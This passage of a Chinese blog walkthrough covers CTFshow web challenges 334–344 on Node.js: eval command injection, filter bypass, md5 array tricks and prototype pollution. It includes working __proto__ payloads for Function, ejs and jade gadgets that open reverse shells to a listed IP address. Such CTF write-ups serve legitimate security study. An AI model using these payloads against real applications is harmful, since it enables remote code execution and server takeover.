) &#123;delete Object.prototype[a]; &#125;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;)&#125;\\r\\n&#x2F;&#x2F;&quot;&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029955.jpeg\" alt=\"在这里插入图片描述\"><br>这里需要注意，我们的<code>ConType-type</code>需要修改为<code>application/json</code>，这样才能让<code>__proto__</code>成为键值而非原型，之所以可以直接这样修改是因为<code>express框架</code>支持根据<code>Content-Type</code>来解析<code>请求Body</code>。</p>\n<p>同时，这里之所以不用<code>require</code>的原因如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Function 环境下没有 require 函数，直接使用require(‘child_process’) 会报错，所以我们要用 global.process.mainModule.constructor._load 来代替。</p></blockquote>\n<h2 id=\"CTFshow系列\"><a href=\"#CTFshow系列\" class=\"headerlink\" title=\"CTFshow系列\"></a>CTFshow系列</h2><h3 id=\"web334\"><a href=\"#web334\" class=\"headerlink\" title=\"web334\"></a>web334</h3><p>给了一个附件(zip)，打开的话是两个文件，具体内容如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#user.js\nmodule.exports &#x3D; &#123;\n  items: [\n    &#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;\n  ]\n&#125;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#login.js\nvar express &#x3D; require(&#39;express&#39;);\nvar router &#x3D; express.Router();\nvar users &#x3D; require(&#39;..&#x2F;modules&#x2F;user&#39;).items;\n \nvar findUser &#x3D; function(name, password)&#123;\n  return users.find(function(item)&#123;\n    return name!&#x3D;&#x3D;&#39;CTFSHOW&#39; &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;\n  &#125;);\n&#125;;\n\n&#x2F;* GET home page. *&#x2F;\nrouter.post(&#39;&#x2F;&#39;, function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var sess &#x3D; req.session;\n  var user &#x3D; findUser(req.body.username, req.body.password);\n \n  if(user)&#123;\n    req.session.regenerate(function(err) &#123;\n      if(err)&#123;\n        return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;&#125;);\n      &#125;\n\n      req.session.loginUser &#x3D; user.username;\n      res.json(&#123;ret_code: 0, ret_msg: &#39;登录成功&#39;,ret_flag:flag&#125;);\n    &#125;);\n  &#125;else&#123;\n    res.json(&#123;ret_code: 1, ret_msg: &#39;账号或密码错误&#39;&#125;);\n  &#125;\n\n&#125;);\n\nmodule.exports &#x3D; router;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看到<code>user.js</code>里给出了账密，接下来我们在看<code>login.js</code>，这里的话可以看到对账号进行了一个<code>toUpperCase()</code>函数处理，这个函数的作用是将小写字符全部改为大写字符，如下图所示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029006.jpeg\" alt=\"在这里插入图片描述\"><br>因此我们这里的话账号是<code>CTFSHOW</code>，我们只需要输入<code>ctfshow</code>，他就可以变成<code>CTFSHOW</code>辣<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029090.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web335\"><a href=\"#web335\" class=\"headerlink\" title=\"web335\"></a>web335</h3><h4 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h4><p>进入后环境如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029039.jpeg\" alt=\"在这里插入图片描述\"><br>没看到有什么有用信息，这个时候查看一下源代码看看有没有有用信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029408.jpeg\" alt=\"在这里插入图片描述\"><br>发现提示了<code>eval</code>参数，这个时候我们就需要看一个东西了，即如何在<code>Node.js</code>执行命令<br><a href=\"http://nodejs.cn/api/child_process.html\">http://nodejs.cn/api/child_process.html</a><br>在其中可以看到这个函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029416.jpeg\" alt=\"在这里插入图片描述\"><br>这个只需要写入命令即可，因此我们对其进行简单尝试</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;ls&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029425.jpeg\" alt=\"在这里插入图片描述\"><br>成功执行命令，接下来尝试获取<code>flag</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;cat f*&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029451.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h4><p>还有另一个函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029522.jpeg\" alt=\"在这里插入图片描述\"><br>这个<code>spawnSync</code>函数的话是需要两个参数，返回值是一个可选项，但当返回值不填时，默认返回的是<code>Object</code>，所以这里其实是三个参数，即命令，命令的参数，以及返回格式，比如我们这里想执行<code>ls .</code>，那我们这里就可以写成<code>spawnSync(&#39;ls&#39;,[&#39;.&#39;]).output</code>，接下来尝试在靶场中执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">eval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;.&#39;]).output<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029619.jpeg\" alt=\"在这里插入图片描述\"><br>成功执行，接下来查看flag</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">eval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl00g.txt&#39;]).output<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029844.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web336\"><a href=\"#web336\" class=\"headerlink\" title=\"web336\"></a>web336</h3><p>和上关的环境相似，这里尝试上关的payload</p>\n<h4 id=\"方法一-1\"><a href=\"#方法一-1\" class=\"headerlink\" title=\"方法一\"></a>方法一</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;cat f*&#39;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029852.jpeg\" alt=\"在这里插入图片描述\"><br>回显<code>tql</code>，一眼顶真，这是某些字符串被过滤掉了，这里的话感觉应该是<code>execSync</code>，我们这里可以采用拼接的方法来进行绕过，然后本来的话是<code>.execSync</code>，我们这里可以修改为<code>[&#39;exe&#39;+&#39;Sync&#39;]</code>，小知识<code>[xxx]=.xxx</code>，因此我们这里尝试一下这个方法</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">eval&#x3D;require(&#39;child_process&#39;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;)\n&#x2F;&#x2F;+号进行了URL编码，这是因为不编码的话+会被解析为空格<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029916.jpeg\" alt=\"在这里插入图片描述\"><br>同理，查看<code>flag</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029951.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"方法二-1\"><a href=\"#方法二-1\" class=\"headerlink\" title=\"方法二\"></a>方法二</h4><p>用上面的第二个函数(spawnSync)可正常执行命令</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">eval&#x3D;require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).output<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029992.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web-337\"><a href=\"#web-337\" class=\"headerlink\" title=\"web 337\"></a>web 337</h3><p>题目给出了源代码，如下所示</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var express &#x3D; require(&#39;express&#39;);\nvar router &#x3D; express.Router();\nvar crypto &#x3D; require(&#39;crypto&#39;);\n\nfunction md5(s) &#123;\n  return crypto.createHash(&#39;md5&#39;)\n    .update(s)\n    .digest(&#39;hex&#39;);\n&#125;\n\n&#x2F;* GET home page. *&#x2F;\nrouter.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;xxxxxxx&#39;;\n  var a &#x3D; req.query.a;\n  var b &#x3D; req.query.b;\n  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;\n  \tres.end(flag);\n  &#125;else&#123;\n  \tres.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);\n  &#125;\n\n&#125;);\n\nmodule.exports &#x3D; router;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>重点在于</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;\n  \tres.end(flag);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>md5的绕过，这里可以采用数组绕过的方式，构造如下语句即可</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">a[]&#x3D;1&amp;b&#x3D;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029093.jpeg\" alt=\"在这里插入图片描述\"></p>\n<p>也可以采用这个payload</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">a[a]&#x3D;1&amp;b[b]&#x3D;12<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029236.jpeg\" alt=\"在这里插入图片描述\"></p>\n<p>这是因为此时题目两个打印出来的是一致的，都是<code>Object</code>，所以<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029773.jpeg\" alt=\"在这里插入图片描述\"><br>传传<code>a[0]=1&amp;b[0]=2</code>不行是因为当我们这样传的时候相当于创了个变量<code>a=[1] b=[2]</code>，此时的结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029258.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web338\"><a href=\"#web338\" class=\"headerlink\" title=\"web338\"></a>web338</h3><p>这里给出了源代码，其中的<code>login.js</code>文件内容如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var express &#x3D; require(&#39;express&#39;);\nvar router &#x3D; express.Router();\nvar utils &#x3D; require(&#39;..&#x2F;utils&#x2F;common&#39;);\n\n\n\n&#x2F;* GET home page.  *&#x2F;\nrouter.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var secert &#x3D; &#123;&#125;;\n  var sess &#x3D; req.session;\n  let user &#x3D; &#123;&#125;;\n  utils.copy(user,req.body);\n  if(secert.ctfshow&#x3D;&#x3D;&#x3D;&#39;36dboy&#39;)&#123;\n    res.end(flag);\n  &#125;else&#123;\n    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);\n  &#125;\n\n\n&#125;);\n\nmodule.exports &#x3D; router;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这个用到了<code>utils</code>里的<code>copy</code>函数，我们这里看一下<code>utils</code>中<code>comman.js</code>文件里的内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">module.exports &#x3D; &#123;\n  copy:copy\n&#125;;\n\nfunction copy(object1, object2)&#123;\n    for (let key in object2) &#123;\n        if (key in object2 &amp;&amp; key in object1) &#123;\n            copy(object1[key], object2[key])\n        &#125; else &#123;\n            object1[key] &#x3D; object2[key]\n        &#125;\n    &#125;\n  &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这个的话就是一个简单的赋值，看这里就能猜出考察点是<code>Node.js</code>的原型污染，这里我们如果<code>key</code>是<code>__proto__</code>，就可以实现一个属性污染，这里要求的条件<code>secert.ctfshow===&#39;36dboy&#39;</code>，如果我们去设置一个<code>&quot;__proto__&quot;:&quot;ctfshow:36dboy&quot;</code>,它首先在<code>secret</code>中寻找，没找到<code>ctfshow</code>，就会往上继续找，此时就会找到<code>Object</code>，因为<code>Object.prototype</code>中有<code>ctfshow</code>，所以此时我们就满足了条件，成功绕过</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029319.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web339\"><a href=\"#web339\" class=\"headerlink\" title=\"web339\"></a>web339</h3><h4 id=\"方法一-2\"><a href=\"#方法一-2\" class=\"headerlink\" title=\"方法一\"></a>方法一</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">#login.js 部分代码\nrouter.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var secert &#x3D; &#123;&#125;;\n  var sess &#x3D; req.session;\n  let user &#x3D; &#123;&#125;;\n  utils.copy(user,req.body);\n  if(secert.ctfshow&#x3D;&#x3D;&#x3D;flag)&#123;\n    res.end(flag);\n  &#125;else&#123;\n    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);\n  &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>单看这个<code>login.js</code>的话，我们这里不知道<code>flag</code>，肯定是无法满足<code>secert.ctfshow===flag</code>的<br>与上题相似，但这里的<code>api.js</code>内容中有这样一串代码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">router.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;);\n&#125;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果我们可以自定义query的内容，就可以实现RCE，所以我们这里的话就用原型链污染来修改<code>__proto__</code>的值，具体payload如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xx.xxx.xxx&#x2F;xxxxx 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029434.jpeg\" alt=\"在这里插入图片描述\"><br>接下来去访问api接口，从而调用这个<code>query</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029450.jpeg\" alt=\"在这里插入图片描述\"><br>此时查看我们监听的7777端口，成功反弹shell<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029578.jpeg\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cat login.js|grep flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029667.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"方法二-2\"><a href=\"#方法二-2\" class=\"headerlink\" title=\"方法二\"></a>方法二</h4><p>这个题使用了ejs模板，对于<code>ejs模板RCE</code>我们这里的话可以看一下这两篇文章<br><a href=\"https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/\">https://evi0s.com/</a><br><a href=\"https://xz.aliyun.com/t/7184#toc-7\">https://xz.aliyun.com/t/7184#toc-7</a><br>里面对其进行了具体分析，我比较菜，没大看懂，只知道最后的方法的话就是对一个名为<code>outputFunctionName</code>的成员进行赋值，其内容是我们的恶意代码，然后我们再次请求，就可以触发这个代码的执行，具体payload如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP地址&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029691.jpeg\" alt=\"在这里插入图片描述\"></p>\n<p>此时已成功写入恶意代码，接下来刷新一下界面即可成功反弹shell</p>\n<h3 id=\"web340\"><a href=\"#web340\" class=\"headerlink\" title=\"web340\"></a>web340</h3><p>这里的话环境和上关类似，但<code>login.js</code>中的内容略有改动，具体如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;* GET home page.  *&#x2F;\nrouter.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var user &#x3D; new function()&#123;\n    this.userinfo &#x3D; new function()&#123;\n    this.isVIP &#x3D; false;\n    this.isAdmin &#x3D; false;\n    this.isAuthor &#x3D; false;\n    &#125;;\n  &#125;\n  utils.copy(user.userinfo,req.body);\n  if(user.userinfo.isAdmin)&#123;\n   res.end(flag);\n  &#125;else&#123;\n   return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;&#125;);\n  &#125;\n\n\n&#125;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>改动点在于<code>utils.copy(user.userinfo,req.body);</code>，原本是<code>user</code>的，所以说也就是原型链多了一层，我们再套一层即可，本来的原型链应该是</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">user.__proto__-&gt;Object.__proto__<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>现在变成了</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">user.userinfo__proto-&gt;user.__proto__-&gt;Object.__proto__<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>因此我们这里在上一关的payload基础上多加一个<code>__proto__</code>即可，具体payload如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;IP地址&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029790.jpeg\" alt=\"在这里插入图片描述\"><br>而后POST发包访问<code>/api</code>接口<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029885.jpeg\" alt=\"在这里插入图片描述\"><br>查看是否成功反弹shell<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029947.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web341\"><a href=\"#web341\" class=\"headerlink\" title=\"web341\"></a>web341</h3><p>这里缺少了<code>api.js</code>，这样的话就说明没法再去用之前的方法来做了，但考虑到这里的<code>ejs模板</code>，所以这里的话应该是用ejs来进行反弹shell的，尝试用此payload进行反弹shell，与之前payload相似，多套一层<code>__proto__</code>，具体payload如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.255.142&#x2F;7777 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;&#125;\n&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>而后刷新一下界面，以此来执行我们的恶意代码，接下来查看VPS是否成功反弹shell<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029124.jpeg\" alt=\"在这里插入图片描述\"><br>这里的话flag没有在这里，需要我们自己找一下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">find &#x2F; |grep flag\ncat &#x2F;flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029174.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Web342\"><a href=\"#Web342\" class=\"headerlink\" title=\"Web342\"></a>Web342</h3><p><code>jade</code>的原型链污染，参考链接<a href=\"https://xz.aliyun.com/t/7025\">https://xz.aliyun.com/t/7025</a>，由于node.js了解较少，所以这里参考其他师傅的payload进行尝试，等学会node.js再对具体代码进行分析，payload如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.255.142&#x2F;7777 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029198.jpeg\" alt=\"在这里插入图片描述\"><br>接下来刷新界面，查看监vps<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029317.jpeg\" alt=\"在这里插入图片描述\"><br>成功反弹shell，接下来查看<code>flag</code>即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029446.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Web343\"><a href=\"#Web343\" class=\"headerlink\" title=\"Web343\"></a>Web343</h3><p>说是增加了过滤，但仍沿用上一关payload，亦可打通<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029487.jpeg\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029690.jpeg\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Web344\"><a href=\"#Web344\" class=\"headerlink\" title=\"Web344\"></a>Web344</h3><p>源码如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag &#x3D; &#39;flag_here&#39;;\n  if(req.url.match(&#x2F;8c|2c|\\,&#x2F;ig))&#123;\n  \tres.end(&#39;where is flag :)&#39;);\n  &#125;\n  var query &#x3D; JSON.parse(req.query.query);\n  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;\n  \tres.end(flag);\n  &#125;else&#123;\n  \tres.end(&#39;where is flag. :)&#39;);\n  &#125;\n\n&#125;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到我们这里需要满足三个条件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;\n2、query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;\n3、query.isVIP&#x3D;&#x3D;&#x3D;true<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>我们这里平常的话如果没有过滤的话，直接这样写payload就可以</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;<span aria-hidden=\"true\" 